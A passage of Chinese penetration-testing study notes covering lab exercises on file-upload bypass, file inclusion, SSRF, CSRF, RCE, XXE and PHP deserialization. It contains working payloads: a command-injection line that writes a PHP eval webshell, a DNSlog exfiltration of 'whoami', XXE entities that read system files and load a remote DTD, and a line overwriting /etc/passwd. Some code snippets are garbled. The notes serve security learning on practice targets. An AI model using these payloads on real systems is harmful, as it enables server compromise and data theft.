id="xss"><a class="anchor" href="#xss">#</a> XSS</h2>
<h3 id="csp策略"><a class="anchor" href="#csp策略">#</a> CSP 策略</h3>
<p>只允许加载本地源图片，用于防止 XSS 注入</p>
<h2 id="文件上传"><a class="anchor" href="#文件上传">#</a> 文件上传</h2>
<h3 id="update-labs攻略php"><a class="anchor" href="#update-labs攻略php">#</a> update-labs 攻略（php）</h3>
<table>
<thead>
<tr>
<th>关卡</th>
<th>通关技巧</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>前端 js 绕过，删除对应代码</td>
</tr>
<tr>
<td>2</td>
<td>修改请求头文件类型</td>
</tr>
<tr>
<td>3</td>
<td>上传 php 其他文件类型绕过</td>
</tr>
<tr>
<td>4</td>
<td>上传.htaccess 文件绕过</td>
</tr>
<tr>
<td>5</td>
<td>大小写绕过： <code>phP</code></td>
</tr>
<tr>
<td>6</td>
<td>空格绕过： <code>php </code></td>
</tr>
<tr>
<td>7</td>
<td>. 绕过： <code>php.</code> （Windows 特性）</td>
</tr>
<tr>
<td>8</td>
<td>文件隐藏寄生： <code>.php::$data</code>  (Windows 特性)</td>
</tr>
<tr>
<td>9</td>
<td>规则多写绕过： <code>.php. .</code></td>
</tr>
<tr>
<td>10</td>
<td>双写： <code>.pphphp</code></td>
</tr>
<tr>
<td>11</td>
<td>文件名后 <code>%00</code>  截断 （ <code>%00=null</code> ）</td>
</tr>
<tr>
<td>12</td>
<td>同 11 关，区别是 post 请求</td>
</tr>
<tr>
<td>13</td>
<td>图片码  <code>copy xxx.jpg /b + shell.php /a webshell.php</code> \</td>
</tr>
<tr>
<td></td>
<td><code>/b</code> ：以二进制文件格式打开 \</td>
</tr>
<tr>
<td></td>
<td>头部 2 字节检测，文件包含漏洞</td>
</tr>
<tr>
<td>14</td>
<td>同 13 关</td>
</tr>
<tr>
<td>15</td>
<td>判断文件类型</td>
</tr>
<tr>
<td>16</td>
<td>上传的图片码会二次渲染后保存新图片，将无用的十六进制去除     \</td>
</tr>
<tr>
<td></td>
<td>找和原图片码相同的十六进制插入 payload，gif 格式更容易通过</td>
</tr>
<tr>
<td>17</td>
<td>条件竞争，并发上传，文件短时间内会在对方服务器上保存         \</td>
</tr>
<tr>
<td></td>
<td>访问文件，目的是为了写入另一个文件</td>
</tr>
<tr>
<td>18</td>
<td>同 17，但需确认 apache 用哪些后缀进行 php 解析 (httpd.conf)</td>
</tr>
<tr>
<td>19</td>
<td>上传文件名称保存 php</td>
</tr>
<tr>
<td>
<p>20</p>
</td>
<td>
<p>1. 修改文件类型 image/jpeg<br />
2. 名称 name='save_name [0]'<br />
3. 名称 name='save_name [2]<br />
 4. 后缀类型改为 jpg</p>
</td>
</tr>
</tbody>
</table>
<h2 id="文件包含php"><a class="anchor" href="#文件包含php">#</a> 文件包含（php）</h2>
<ul>
<li>
<p>调用使用 <code>http</code></p>
</li>
<li>
<p><code>allow url fopen=on</code>  必须是开</p>
</li>
<li>
<p><code>allow url include=on</code>  必须是开</p>
</li>
<li>
<p>文件包含当利用 <code>include</code> \  <code>include_once</code> \  <code>require</code> \  <code>require_once</code>  函数调用，不管什么文件都会被解析执行</p>
</li>
</ul>
<div class="note info">
<p class="rainbow">伪协议</p>
</div>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>file<span class="token punctuation">:</span><span class="token comment">//							## 必须使用绝对路径，不受配置影响</span></pre></td></tr><tr><td data-num="2"></td><td><pre>php<span class="token punctuation">:</span><span class="token comment">//filter/resource | **...	##</span></pre></td></tr><tr><td data-num="3"></td><td><pre>php<span class="token punctuation">:</span><span class="token comment">//input						## 可用 post，不受配置影响</span></pre></td></tr><tr><td data-num="4"></td><td><pre>phar<span class="token punctuation">:</span><span class="token comment">//							##zip 内的文件调用，不受配置影响</span></pre></td></tr><tr><td data-num="5"></td><td><pre>zlib<span class="token punctuation">:</span><span class="token comment">//compress.zip://			## 调用，不受配置影响</span></pre></td></tr><tr><td data-num="6"></td><td><pre>data<span class="token punctuation">:</span><span class="token comment">//text/plan,base64, 代码	   ## 配置必须是 on</span></pre></td></tr><tr><td data-num="7"></td><td><pre>日志文件getshell				  <span class="token comment">## 要使用 base64 传输到 log 文件利用</span></pre></td></tr></table></figure><h2 id="csrf"><a class="anchor" href="#csrf">#</a> CSRF</h2>
<blockquote>
<p>XSS 和 CSRF 的区别</p>
</blockquote>
<ul>
<li>XSS 主要是盗取受害者的 cookie</li>
<li>CSRF 是直接利用受害者在客户端<strong>未失效</strong>的身份信息</li>
</ul>
<blockquote>
<p>攻击方式</p>
</blockquote>
<ol>
<li>构造隐藏表单</li>
<li>构造图片或链接隐藏</li>
<li>利用 js 自动执行</li>
<li>利用第三方网站或应用来执行</li>
<li>自媒体</li>
</ol>
<h3 id="dvwa"><a class="anchor" href="#dvwa">#</a> DVWA</h3>
<blockquote>
<p>CSRF</p>
</blockquote>
<p>低：删除 Referer</p>
<p>中：构造 get 请求，修改 Referer</p>
<h3 id="结合xss"><a class="anchor" href="#结合xss">#</a> 结合 XSS</h3>
<p>使用 img|scirpt src=get 方式</p>
<h2 id="ssrf"><a class="anchor" href="#ssrf">#</a> SSRF</h2>
<figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.baidu.com/link=http://www.bai.com</span></span></pre></td></tr></table></figure><p>利用 SSRF 漏洞：目标是从外网无法访问的内部系统</p>
<p>常见于分享链接，转发，有道翻译，转码（转客户端）服务，未公开的 api，图片加载和下载</p>
<p>1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息；</p>
<p>2. 攻击运行在内网或本地的应用程序 (比如溢出);<br />
3. 对内网 web 应用进行指纹识别，通过访问默认文件实现；<br />
4. 攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击 (比如 struts2，sq1i 等);<br />
5. 利用 file 协议读取本地文件等。<br />
6. 各个协议调用探针:http,file,dict,ftp,gopher 等</p>
<ul>
<li>从 url 中找关键词</li>
</ul>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>利用 google 语法加上关键字找 SSRF 漏洞</pre></td></tr><tr><td data-num="2"></td><td><pre>?share&#x3D;</pre></td></tr><tr><td data-num="3"></td><td><pre>?wap&#x3D;</pre></td></tr><tr><td data-num="4"></td><td><pre>url</pre></td></tr><tr><td data-num="5"></td><td><pre>link</pre></td></tr><tr><td data-num="6"></td><td><pre>src</pre></td></tr><tr><td data-num="7"></td><td><pre>source</pre></td></tr><tr><td data-num="8"></td><td><pre>target</pre></td></tr><tr><td data-num="9"></td><td><pre>display</pre></td></tr><tr><td data-num="10"></td><td><pre>sourceURL</pre></td></tr><tr><td data-num="11"></td><td><pre>imageURL</pre></td></tr><tr><td data-num="12"></td><td><pre>domain</pre></td></tr></table></figure><ul>
<li>利用伪协议</li>
</ul>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>file<span class="token punctuation">:</span><span class="token comment">//C:rebots.txt</span></pre></td></tr><tr><td data-num="2"></td><td><pre>dict<span class="token punctuation">:</span><span class="token comment">//192.168.0.0:80 | 0.0:3306	 ## 用于获取目标服务器端口上运行的服务版本信息</span></pre></td></tr><tr><td data-num="3"></td><td><pre>ftp<span class="token punctuation">:</span><span class="token comment">//0.0:3389						 ## 不太准 需要内置 ftp 命令</span></pre></td></tr><tr><td data-num="4"></td><td><pre>sftp<span class="token punctuation">:</span><span class="token comment">//								 ## 类似 ssh</span></pre></td></tr><tr><td data-num="5"></td><td><pre>gopher<span class="token punctuation">:</span><span class="token comment">//0.0:80/_POST/user.txt%20&lt;br>host:www.ssrf.com:80</span></pre></td></tr></table></figure><h3 id="绕过思路"><a class="anchor" href="#绕过思路">#</a> 绕过思路</h3>
<blockquote>
<p>php 加 @</p>
</blockquote>
<figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.aaa.com@www.bbb.com</span></span></pre></td></tr></table></figure><blockquote>
<p>短链接</p>
</blockquote>
<blockquote>
<p>ip 进制转换</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>2 进制</pre></td></tr><tr><td data-num="2"></td><td><pre>8 进制</pre></td></tr><tr><td data-num="3"></td><td><pre>16 进制</pre></td></tr><tr><td data-num="4"></td><td><pre>ipv6:[::1]</pre></td></tr><tr><td data-num="5"></td><td><pre>颜文字数字：1️⃣</pre></td></tr></table></figure><blockquote>
<p>CRLF 编码</p>
</blockquote>
<h3 id="总结"><a class="anchor" href="#总结">#</a> 总结</h3>
<ul>
<li>Xss 跨站脚本攻击：利用 HTML 执行攻击，受害者是用户，盗取 cookie</li>
<li>CSRF 跨站请求伪造：利用受害者未失效的身份认证信息，对服务器直接执行攻击</li>
<li>SSRF 服务器请求伪造：利用服务器的身份去执行攻击</li>
</ul>
<h2 id="rce任意命令执行漏洞"><a class="anchor" href="#rce任意命令执行漏洞">#</a> RCE 任意命令执行漏洞</h2>
<blockquote>
<p>条件</p>
</blockquote>
<p>1、代码中存在调用命令的函数</p>
<p>2、函数中存在用户可控的点</p>
<p>3、可控点没有过滤，或过滤不严格</p>
<blockquote>
<p>pikachu RCE exel ping 抓包</p>
</blockquote>
<pre><code class="language-cmd">127.0.0.1 &amp;&amp; echo &quot;&lt;?php eval($_GET['a']);?&gt;&quot; &gt; rcshell.php
</code></pre>
<blockquote>
<p>绕过思路</p>
</blockquote>
<pre><code class="language-cmd">前提：需要知道服务器上的文件目录
拼接绕过，结合系统的特性来
linux   cat user.txt =&gt; a=c;b=at;c=user;$a$b $c.php	
windows可以使用环境变量特性，用~进行拼接
cat b &gt;&gt; a

空格绕过
+ %09

单引号，双引号绕过
cat user,txt =&gt; ca&quot;&quot;t us''er.txt

转义符:\
cat user.txt =&gt;ca\t u\s\e\r.txt

管道符:|
user.txt 进行base64编码 dXN1ci50eHQ=cat 
cat &quot;dxNlci50eHQ=&quot; | base64 -d
通配符绕过:
*:任意字符
?:任意单个字符
cat us??.txt   cat u???.???

linux  网站需要有写权限
cat&gt;/etc/passwd
</code></pre>
<blockquote>
<p>无回显 仅 linux</p>
</blockquote>
<pre><code class="language-cmd">ping 'whoami'.dnslog...
</code></pre>
<h3 id="挖掘技巧"><a class="anchor" href="#挖掘技巧">#</a> 挖掘技巧</h3>
<blockquote>
<p>白盒</p>
</blockquote>
<p>直接搜索含有常用的调用函数，上下文看看有没有可控的参数</p>
<blockquote>
<p>黑盒</p>
</blockquote>
<p>找到系统可能调用的第三方资源，猜测后台代码是什么样的，后进一步进行分析，是否存在限制或者漏洞，用 fuzz 进行测试</p>
<h2 id="xxe漏洞"><a class="anchor" href="#xxe漏洞">#</a> XXE 漏洞</h2>
<blockquote>
<p>pikachu xxe 漏洞</p>
</blockquote>
<blockquote>
<p>读服务器文件</p>
</blockquote>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0"?></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"></pre></td></tr><tr><td data-num="3"></td><td><pre>&lt;!ENTITY yjjy SYSTEM "file:///c:/windows/win.ini"></pre></td></tr><tr><td data-num="4"></td><td><pre></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&yjjy;">&amp;yjjy;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><blockquote>
<p>远程加载</p>
</blockquote>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre>自建服务器，存放dtd文件</pre></td></tr><tr><td data-num="2"></td><td><pre>&lt;!ENTITY yjjy SYSTEM "file:///c:/yjjy.txt"></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>前端传参</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token prolog">&lt;?xml version="1.0"?></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"></pre></td></tr><tr><td data-num="7"></td><td><pre>&lt;!ENTITY % a SYSTEM"http://10.135.32.105/yjjy.dtd"></pre></td></tr><tr><td data-num="8"></td><td><pre>%a ;</pre></td></tr><tr><td data-num="9"></td><td><pre></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&yjjy;">&amp;yjjy;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>通过http协议，协助SSRF</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>无回显</pre></td></tr><tr><td data-num="15"></td><td><pre>伪协议请求</pre></td></tr></table></figure><h3 id="挖掘技巧-2"><a class="anchor" href="#挖掘技巧-2">#</a> 挖掘技巧</h3>
<blockquote>
<p>通过文件类型进行判断</p>
</blockquote>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?xml version="1.0"?></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">fo</span> <span class="token punctuation">[</span><span class="token internal-subset"></pre></td></tr><tr><td data-num="3"></td><td><pre>&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"></pre></td></tr><tr><td data-num="4"></td><td><pre></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>&amp;xxe ;</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>bb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><blockquote>
<p>通过参数传递（需要 url 编码）</p>
</blockquote>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre>xml=xxxxxxxxxxx</pre></td></tr></table></figure><blockquote>
<p>通过修改请求头 MIME</p>
</blockquote>
<figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre>比如json</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>将MIME的application/json -> application/xml</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>&#123;username:'aaa','password':'bbb'&#125;</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token prolog">&lt;?xml version="1.0"?></span></pre></td></tr><tr><td data-num="8"></td><td><pre>&lt;!DOCTYPE a [</pre></td></tr><tr><td data-num="9"></td><td><pre>&lt;!ENTITY d SYSTEM "file:///C://Windows//win.ini"></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&d;">&amp;d;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h2 id="反序列化漏洞"><a class="anchor" href="#反序列化漏洞">#</a> 反序列化漏洞</h2>
<blockquote>
<p>利用条件</p>
</blockquote>
<ol>
<li>必须有 unserialize () 函数</li>
<li>unserialize () 函数的参数必须可控</li>
<li>文件中存在可利用的类，且类中有魔术方法</li>
</ol>
<blockquote>
<p>php 序列化</p>
</blockquote>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">new</span> <span class="token function">car</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"byd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"混动"</span><span class="token punctuation">,</span><span class="token number">2022</span><span class="token punctuation">,</span><span class="token number">12.99</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"car"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"carName"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"BYD"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span>“混动<span class="token string double-quoted-string">";s:4:"</span>date<span class="token string double-quoted-string">";i:2022;s:5:"</span>price"<span class="token punctuation">;</span>d<span class="token punctuation">:</span><span class="token number">12.99</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><table>
<thead>
<tr>
<th>数据</th>
<th>表示</th>
</tr>
</thead>
<tbody>
<tr>
<td>0:3:&quot;car&quot;:4</td>
<td>O：object，3:3 个字符，car：对象，属性个数</td>
</tr>
<tr>
<td>s:7:&quot;carName&quot;;</td>
<td>S：String，7：7 个字符，carName：值</td>
</tr>
<tr>
<td>i:2022;</td>
<td>i：int，值：2022</td>
</tr>
<tr>
<td>d:12.99;</td>
<td>d：float 浮点数，12.99：值</td>
</tr>
</tbody>
</table>
<blockquote>
<p>反序列化</p>
</blockquote>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword type-declaration">object</span><span class="token punctuation">(</span>_PHPIncomplete_Class<span class="token punctuation">)</span><span class="token comment">#1(5)&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token punctuation">[</span><span class="token string double-quoted-string">"_PHP_ Incomplet_Class_Name"</span><span class="token punctuation">]</span><span class="token operator">=></span><span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"car"</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token punctuation">[</span><span class="token string double-quoted-string">"carName"</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"BYD"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">[</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"混动"</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token operator">=></span><span class="token keyword type-declaration">int</span><span class="token punctuation">(</span><span class="token number">2022</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">[</span><span class="token string double-quoted-string">"price"</span><span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token keyword type-declaration">float</span><span class="token punctuation">(</span><span class="token number">12.99</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><blockquote>
<p>POP 链</p>
</blockquote>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;scrpt>alert(1)&lt;/scrpt>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></pre></td></tr></table></figure><blockquote>
<p>pikachu 反序列化漏洞</p>
</blockquote>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token attr-name">class</span> <span class="token attr-name">S</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token attr-name">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>		<span class="token attr-name">var</span> <span class="token attr-name">$test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token attr-name">pikachu;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token attr-name">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token attr-name">$s</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> new</span> <span class="token attr-name">S();</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token attr-name">$s-</span><span class="token punctuation">></span></span> test = "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert(0)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>	$aa= serialize($s)</pre></td></tr><tr><td data-num="9"></td><td><pre>	echo $aa;</pre></td></tr><tr><td data-num="10"></td><td><pre>></pre></td></tr></table></figure><h2 id="逻辑漏洞"><a class="anchor" href="#逻辑漏洞">#</a> 逻辑漏洞</h2>
<blockquote>
<p>常见漏洞</p>
</blockquote>
<ol>
<li>支付漏洞</li>
<li>修改密码
<ul>
<li>需要旧密码
<ul>
<li>验证不输入旧密码可否修改，或者尝试抓包将提交旧密码参数删除</li>
<li>验证旧密码输入处是否存在 sql 注入</li>
<li>验证是否可跳过输入旧密码步骤直接修改新密码</li>
</ul>
</li>
<li>不需要旧密码
<ul>
<li>验证修改密码提交数据中是否包含了用户身份信息</li>
<li>验证提交的用户身份信息被修改后是否可以成功修改</li>
<li>验证修改 cookies 中的每一项包含用户身份的信息是否会影响修改结果</li>
<li>验证是否可以在不登陆的情况下直接提交修改密码的请求进行修改</li>
<li>验证是否可以越权修改任意用户密码</li>
</ul>
</li>
</ul>
</li>
<li>密码找回</li>
<li>越权</li>
</ol>
<h2 id="漏洞扫描"><a class="anchor" href="#漏洞扫描">#</a> 漏洞扫描</h2>
<blockquote>
<p>AWVS 漏洞扫描工具</p>
</blockquote>
<blockquote>
<p>one-fox 漏洞工具集合   xray 漏洞扫描工具 goby 漏洞扫描 Yakit 漏洞扫描</p>
</blockquote>
<blockquote>
<p>afrog 漏洞扫描</p>
</blockquote>
<blockquote>
<p>nuclei  poc： <code>https://github.com/ExpLangcn/NucleiTP</code></p>
</blockquote>
<h2 id="配置挖洞环境"><a class="anchor" href="#配置挖洞环境">#</a> 配置挖洞环境</h2>
<blockquote>
<p>burp 插件</p>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>下载地址</th>
<th>说明</th>
<th>注意</th>
</tr>
</thead>
<tbody>
<tr>
<td>FakeIP</td>
<td><a target="_blank" rel="noopener" href="https://github.com/AeolusTF/BurpFakeIP">https://github.com/AeolusTF/BurpFakeIP</a></td>
<td>源 IP 管理</td>
<td></td>
</tr>
<tr>
<td>Hae</td>
<td>BP 商店</td>
<td>历史高亮</td>
<td>需要更新配置文件</td>
</tr>
<tr>
<td>Knife</td>
<td><a target="_blank" rel="noopener" href="https://github.com/bit4woo/knife">https://github.com/bit4woo/knife</a></td>
<td>中文字符，过滤杂包，常用 payload</td>
<td></td>
</tr>
<tr>
<td>DomainHunterPro</td>
<td><a target="_blank" rel="noopener" href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></td>
<td>综合收集信息插件</td>
<td></td>
</tr>
<tr>
<td>xialiao</td>
<td>BP 商店</td>
<td>自动生成数据便于注册（fuzz）</td>
<td></td>
</tr>
<tr>
<td>xiayue</td>
<td><a target="_blank" rel="noopener" href="https://github.com/smxiazi/xia_Yue">https://github.com/smxiazi/xia_Yue</a></td>
<td>越权</td>
<td></td>
</tr>
<tr>
<td>autoDecoder</td>
<td><a target="_blank" rel="noopener" href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a></td>
<td>数据包的处理（加解密、爆破）</td>
<td></td>
</tr>
<tr>
<td>Turbo Intruder</td>
<td><a target="_blank" rel="noopener" href="https://github.com/PortSwigger/turbo-intruder">https://github.com/PortSwigger/turbo-intruder</a></td>
<td>请求轰炸</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
<p>浏览器插件</p>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>下载地址</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>charset</td>
<td>商店</td>
<td>修改编码</td>
</tr>
<tr>
<td>superSearchPlus</td>
<td>商店</td>
<td>信息收集</td>
</tr>
<tr>
<td>hackbar</td>
<td>商店</td>
<td>请求工具</td>
</tr>
<tr>
<td>findsomething</td>
<td>商店</td>
<td>信息收集</td>
</tr>
<tr>
<td>User-Agent Switcher for Chrome</td>
<td>商店</td>
<td>UA 设置</td>
</tr>
<tr>
<td>Proxy SwitchyOmega 3 (ZeroOmega)</td>
<td>商店</td>
<td>代理配置</td>
</tr>
<tr>
<td>Wappalyzer</td>
<td>商店</td>
<td>信息收集</td>
</tr>
<tr>
<td>WhatRuns</td>
<td>商店</td>
<td>信息收集</td>
</tr>
</tbody>
</table>
<h1 id="内网渗透"><a class="anchor" href="#内网渗透">#</a> 内网渗透</h1>
<div class="note info">
<p class="rainbow">渗透步骤</p>
</div>
<p><span class="label info">信息收集 ——&gt; 获取权限 ——&gt; 横向移动 ——&gt; 权限维持 ——&gt; 清理痕迹</span></p>
<h2 id="msf"><a class="anchor" href="#msf">#</a> MSF</h2>
<div class="note info">
<p class="rainbow">名词</p>
</div>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>exploit</td>
<td>攻击方式</td>
</tr>
<tr>
<td>payload</td>
<td>攻击载荷</td>
</tr>
<tr>
<td>auxiliary</td>
<td>辅助检测（收集）</td>
</tr>
</tbody>
</table>
<div class="note info">
<p class="rainbow">目录说明</p>
</div>
<table>
<thead>
<tr>
<th>目录</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>auxiliary</td>
<td>主要包含渗透测试中一些辅助性的脚本，这些即本功能有扫描，嗅探，破解，注入，漏洞挖掘等。</td>
</tr>
<tr>
